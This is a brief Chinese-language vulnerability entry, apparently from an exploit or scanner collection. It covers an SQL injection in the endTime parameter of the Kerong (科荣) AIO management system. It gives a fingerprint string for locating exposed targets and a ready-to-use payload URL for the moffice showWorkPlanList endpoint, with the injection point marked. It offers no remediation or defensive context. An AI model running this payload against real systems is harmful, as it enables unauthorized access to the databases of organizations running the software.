# 科荣AIO管理系统endTime参数存在SQL注入漏洞

科荣AIO管理系统endTime参数 ｜ SQL注入 ｜ —
- **指纹**：`"changeAccount('8000')"`

**Payload**
```
IP/moffice?op=showWorkPlanList&type=1&beginTime=1&endTime=1*&sid=1-
```
- **响应特征**：200